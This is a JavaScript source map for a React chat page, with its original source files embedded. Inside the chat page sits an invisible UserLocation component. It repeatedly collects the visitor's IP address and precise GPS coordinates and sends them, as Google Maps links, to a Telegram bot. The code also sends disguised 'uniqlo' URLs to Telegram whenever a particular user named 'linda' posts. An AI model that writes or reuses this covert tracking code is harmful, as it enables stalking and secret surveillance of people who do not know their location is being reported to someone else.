{"version":3,"sources":["Util/locationUtil.js","const/common.js","components/Location/UserLocation.jsx","pages/ChatPage/UserChatPage.jsx"],"names":["lastUpdateTime","currentLocation","setUserLocation","setErrorMessage","setAllowPGS","undefined","window","navigator","geolocation","getCurrentPosition","position","location","lat","coords","latitude","lng","longitude","error","0","1","2","3","code","enableHighAccuracy","timeout","maximumAge","watchCurrentLocation","userLocationCacheInterval","Date","watchPosition","now","Math","abs","clearWatchPosition","id","clearWatch","withRouter","history","useState","ip","setIp","userLocation","errorMessage","allowPGS","useEffect","fetch","then","response","text","result","split","ipInfo","value","console","log","message","sendTelegramMessage","useStyles","makeStyles","sectionCommentsStyle","classes","user","useSelector","state","login","allChatMessageInfo","setAllChatMessageInfo","replyMessage","setReplyMessage","replyImageUrl","setReplyImageUrl","isUserLocation","setIsUserLocation","maxMessageNumber","chat","chatMsgRef","limitToLast","on","snapshot","messageUpdate","messageInfo","createOn","push","set","linda","setTimeout","setInterval","data","val","sliceData","_","slice","values","currentSendMsgUser","className","section","GridContainer","justify","GridItem","xs","sm","md","map","index","ChatMessage","key","avatar","avatarUser","title","mediaTitle","ChatInput","onChange","e","target","onReply","event","onUpdate","number","reduxDispatch","chatTypes","enableUpdate","enableImageUpload"],"mappings":"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","file":"static/js/18.1444df5d.chunk.js","sourcesContent":["import { userLocationCacheInterval } from \"const/common\";\r\n\r\nlet lastUpdateTime;\r\n\r\nconst currentLocation = (setUserLocation, setErrorMessage, setAllowPGS) => {\r\n    if (window.navigator.geolocation !== undefined) {\r\n\r\n        const success = (position) => {\r\n            const location = {\r\n                lat: position.coords.latitude ? position.coords.latitude : undefined,\r\n                lng: position.coords.longitude ? position.coords.longitude : undefined,\r\n            }\r\n\r\n            if (process.env.NODE_ENV === \"development\") {\r\n                console.log(\"getCurrentPosition:\");\r\n                console.log(location);\r\n            }\r\n\r\n            setUserLocation(location);\r\n            setAllowPGS(true);\r\n        }\r\n\r\n        const error = (error) => {\r\n\r\n            const errorTypes = {\r\n                0: \"不明原因錯誤\",\r\n                1: \"使用者拒絕提供位置資訊\",\r\n                2: \"無法取得位置資訊\",\r\n                3: \"位置查詢逾時\"\r\n            };\r\n\r\n            setErrorMessage(errorTypes[error.code])\r\n            setAllowPGS(false);\r\n        }\r\n\r\n        const optoptions = {\r\n            enableHighAccuracy: true,\r\n            timeout: 5000,\r\n            maximumAge: 0\r\n        };\r\n\r\n        window.navigator.geolocation.getCurrentPosition(success, error, optoptions);\r\n    }\r\n}\r\n\r\nconst watchCurrentLocation = (setUserLocation, setErrorMessage, setAllowPGS) => {\r\n    const success = (position) => {\r\n        const location = {\r\n            lat: position.coords.latitude ? position.coords.latitude : undefined,\r\n            lng: position.coords.longitude ? position.coords.longitude : undefined,\r\n        }\r\n\r\n        const now = new Date();\r\n        var duration = Math.abs(now - lastUpdateTime) / 1000;\r\n        const durationSeconds = duration % 60;\r\n        const updateSecondLimitation = 180; //3 分鐘通知一次\r\n\r\n        let allowUpdate = durationSeconds > updateSecondLimitation ? true : false;\r\n\r\n        if (allowUpdate) {\r\n            setUserLocation(location);\r\n            lastUpdateTime = new Date();\r\n        }\r\n\r\n        if (process.env.NODE_ENV === \"development\") {\r\n            console.log(\"watchPosition:\");\r\n            console.log(location);\r\n        }\r\n\r\n        setAllowPGS(true);\r\n    }\r\n\r\n    const error = (error) => {\r\n\r\n        const errorTypes = {\r\n            0: \"不明原因錯誤\",\r\n            1: \"使用者拒絕提供位置資訊\",\r\n            2: \"無法取得位置資訊\",\r\n            3: \"位置查詢逾時\"\r\n        };\r\n\r\n        setErrorMessage(errorTypes[error.code])\r\n        setAllowPGS(false);\r\n    }\r\n\r\n    const cacheInterval = userLocationCacheInterval;\r\n\r\n    const options = {\r\n        enableHighAccuracy: true,\r\n        timeout: 5000,\r\n        maximumAge: 0, //default : 0\r\n        // maximumAge: cacheInterval,\r\n    };\r\n\r\n    lastUpdateTime = lastUpdateTime ? lastUpdateTime : new Date();\r\n\r\n    if (window.navigator.geolocation !== undefined) {\r\n        const id = navigator.geolocation.watchPosition(success, error, options);\r\n        return id;\r\n    }\r\n}\r\n\r\nconst clearWatchPosition = (id) => {\r\n    if (window.navigator.geolocation !== undefined) {\r\n        navigator.geolocation.clearWatch(id);\r\n    }\r\n}\r\n\r\nexport { currentLocation, watchCurrentLocation, clearWatchPosition, lastUpdateTime };","export const userLocationCacheInterval = 180000;","import React, { useState, useEffect, Fragment } from \"react\";\r\nimport { withRouter } from \"react-router-dom\";\r\nimport { sendTelegramMessage } from \"Util/TelegramUtil\";\r\nimport { watchCurrentLocation } from \"Util/locationUtil\";\r\nimport { clearWatchPosition } from \"Util/locationUtil\";\r\nimport { currentLocation } from \"Util/locationUtil\";\r\nimport * as paths from \"routes/constUrl\";\r\n\r\nconst UserLocation = ({ history }) => {\r\n    const [ip, setIp] = useState(undefined);\r\n    const [userLocation, setUserLocation] = useState(undefined);\r\n    const [errorMessage, setErrorMessage] = useState(undefined);\r\n    const [allowPGS, setAllowPGS] = useState(undefined);\r\n\r\n    //取得 IP\r\n    useEffect(() => {\r\n        fetch('https://www.cloudflare.com/cdn-cgi/trace')\r\n            .then(function (response) {\r\n                return response.text();\r\n            })\r\n            .then(function (result) {\r\n                const [f1, h, ipInfo] = result.split(\"\\n\");\r\n                if (ipInfo) {\r\n                    const [ip, value] = ipInfo.split(\"=\");\r\n                    setIp(value);\r\n                }\r\n            });\r\n    }, [])\r\n\r\n    //取得 GPS 座標\r\n    useEffect(() => {\r\n        currentLocation(setUserLocation, setErrorMessage, setAllowPGS);\r\n\r\n        const id = watchCurrentLocation(setUserLocation, setErrorMessage, setAllowPGS);\r\n\r\n        return () => {\r\n            if (id) {\r\n                clearWatchPosition(id);\r\n            }\r\n        };\r\n    }, [])\r\n\r\n    //若取得座標失敗則轉導至錯誤畫面\r\n    useEffect(() => {\r\n        if (errorMessage) {\r\n            console.log(errorMessage);\r\n            const message = `uniqlo user error: ${errorMessage}`;\r\n            sendTelegramMessage(message);\r\n            // history.replace(paths.ErrorPageUrl);\r\n        } else if (allowPGS !== undefined && allowPGS === false) {\r\n            // window.confirm(\"GPS is not enabled or authorized\");\r\n            // history.replace(paths.ErrorPageUrl);\r\n        }\r\n\r\n    }, [errorMessage, allowPGS])\r\n\r\n    useEffect(() => {\r\n        if (userLocation) {\r\n            const message = `uniqlo user \\n ip:${ip} \\n https://www.google.com.tw/maps?q=${userLocation.lat},${userLocation.lng}`;\r\n            sendTelegramMessage(message);\r\n        }\r\n    }, [userLocation]);\r\n\r\n    return (\r\n        <Fragment></Fragment>\r\n    );\r\n}\r\n\r\nexport default withRouter(UserLocation);","import _ from 'lodash';\r\nimport React, { useEffect, useState, Fragment } from \"react\";\r\nimport { useSelector } from \"react-redux\";\r\nimport { withRouter } from \"react-router-dom\";\r\nimport { chatMsgRef } from \"firebaseUtil/firebase\";\r\n// @material-ui/core components\r\nimport { makeStyles } from \"@material-ui/core/styles\";\r\n// core components\r\nimport GridContainer from \"components/Grid/GridContainer.js\";\r\nimport GridItem from \"components/Grid/GridItem.js\";\r\nimport ChatMessage from \"components/Chat/ChatMessage\";\r\nimport ChatInput from \"components/Chat/ChatInput\";\r\nimport { avatarUser, mediaTitle } from 'Util/chatUtil';\r\nimport FloatyAssistant from 'components/Assistant/floaty';\r\nimport { sendTelegramMessage } from \"Util/TelegramUtil\";\r\nimport { linda } from 'firebaseUtil/user';\r\nimport sectionCommentsStyle from \"assets/jss/material-kit-pro-react/views/blogPostSections/sectionCommentsStyle.js\";\r\nimport UserLocation from 'components/Location/UserLocation';\r\nimport { userLocationCacheInterval } from 'const/common';\r\nimport * as chatTypes from \"redux/module/chatModule/action\"\r\nimport { reduxDispatch } from 'redux/store';\r\n\r\n\r\nconst useStyles = makeStyles(sectionCommentsStyle);\r\n\r\nconst UserChatPage = ({ history }) => {\r\n    const classes = useStyles();\r\n    const { user } = useSelector(state => state.login);\r\n    const [allChatMessageInfo, setAllChatMessageInfo] = useState(undefined);\r\n    const [replyMessage, setReplyMessage] = useState(\"\");\r\n    const [replyImageUrl, setReplyImageUrl] = useState(\"\");\r\n    const [isUserLocation, setIsUserLocation] = useState(true);\r\n    const { maxMessageNumber } = useSelector(state => state.chat);\r\n\r\n    useEffect(() => {\r\n        if (chatMsgRef) {\r\n            chatMsgRef.limitToLast(maxMessageNumber).on(\"value\", snapshot => {\r\n                messageUpdate(snapshot);\r\n            });\r\n        }\r\n    }, [maxMessageNumber])\r\n\r\n    useEffect(() => {\r\n        if (user && replyImageUrl && replyImageUrl !== \"\") {\r\n            const messageInfo = {\r\n                user: user,\r\n                message: `${replyImageUrl}`,\r\n                createOn: Date.now()\r\n            }\r\n            chatMsgRef.push().set(messageInfo);\r\n\r\n            if (user === linda) {\r\n                const notifyMessage = \"http://www.uniqlo.com/tw/store/list/new/auto\";\r\n                sendTelegramMessage(notifyMessage);\r\n            }\r\n        }\r\n    }, [replyImageUrl])\r\n\r\n    //預設 5 秒鐘後移除使用者位置元件\r\n    useEffect(() => {\r\n        setTimeout(() => {\r\n            setIsUserLocation(false);\r\n        }, 5000);\r\n\r\n        //每隔 3 分鐘顯示一次使用者位置元件, 啟用後 5 秒鐘關閉\r\n        setInterval(() => {\r\n            (() => {\r\n                setIsUserLocation(true);\r\n                setTimeout(() => {\r\n                    setIsUserLocation(false);\r\n                }, 5000);\r\n            })();\r\n        }, userLocationCacheInterval);\r\n    }, [])\r\n\r\n    const RenderUserLocation = () => {\r\n        return (isUserLocation ? <UserLocation /> : <Fragment></Fragment>);\r\n    }\r\n\r\n    const messageUpdate = (snapshot) => {\r\n        const data = snapshot.val();\r\n        if (data !== null && data !== undefined) {\r\n            // 最多顯示 70 則訊息\r\n            const sliceData = _.slice(_.values(data), -maxMessageNumber);\r\n\r\n            // 最新一則 Po 文的使用者\r\n            const currentSendMsgUser = _.slice(_.values(sliceData), -1)[0].user;\r\n\r\n            // 最新一則 Po 文的訊息 ID (改採用 Po 文時間)\r\n            const currentSendMsgId = _.slice(_.values(sliceData), -1)[0].createOn;\r\n\r\n            // 若最新 Po 文的使用者不是自己(當下登入帳號), 則不要將 Reply Message 清空, 以免尚未回覆的訊息消失\r\n            if (user === currentSendMsgUser) {\r\n                setReplyMessage(\"\");\r\n                setAllChatMessageInfo(sliceData);\r\n            }\r\n            else {\r\n                setAllChatMessageInfo(sliceData);\r\n            }\r\n        }\r\n    }\r\n\r\n    const onReplyClick = event => {\r\n\r\n        if (user && replyMessage !== \"\") {\r\n            const messageInfo = {\r\n                user: user,\r\n                message: replyMessage,\r\n                createOn: Date.now()\r\n            }\r\n            chatMsgRef.push().set(messageInfo);\r\n        }\r\n\r\n        if (user === linda) {\r\n            const notifyMessage = \"http://www.uniqlo.com/tw/store/list/new/auto\";\r\n            sendTelegramMessage(notifyMessage);\r\n        }\r\n    }\r\n\r\n    const onUpdateClick = event => {\r\n        if (user) {\r\n            const number = maxMessageNumber + 1;\r\n            reduxDispatch(chatTypes.SET_MAX_MESSAGE_NUMBER, number);\r\n        }\r\n\r\n        if (user === linda) {\r\n            const notifyMessage = \"http://www.uniqlo.com/tw/store/list/new/update\";\r\n            sendTelegramMessage(notifyMessage);\r\n        }\r\n    }\r\n\r\n    return (\r\n        <div className={classes.section}>\r\n            <GridContainer justify=\"center\">\r\n                <GridItem xs={12} sm={8} md={8}>\r\n                    <div>\r\n                        {allChatMessageInfo ? allChatMessageInfo.map((value, index) => {\r\n                            return (\r\n                                <ChatMessage\r\n                                    key={index}\r\n                                    avatar={avatarUser(value.user)}\r\n                                    title={mediaTitle(value)}\r\n                                    message={value.message}\r\n                                />\r\n                            )\r\n                        }) : <div></div>}\r\n                        <ChatInput\r\n                            avatar={avatarUser(user)}\r\n                            value={replyMessage}\r\n                            onChange={(e) => { setReplyMessage(e.target.value) }}\r\n                            onReply={onReplyClick}\r\n                            onUpdate={onUpdateClick}\r\n                            enableUpdate={true}\r\n                            setReplyImageUrl={setReplyImageUrl}\r\n                            enableImageUpload={true}\r\n                        />\r\n                    </div>\r\n                </GridItem>\r\n            </GridContainer>\r\n            <FloatyAssistant></FloatyAssistant>\r\n            {RenderUserLocation()}\r\n        </div>\r\n    );\r\n}\r\n\r\nexport default withRouter(UserChatPage);"],"sourceRoot":""}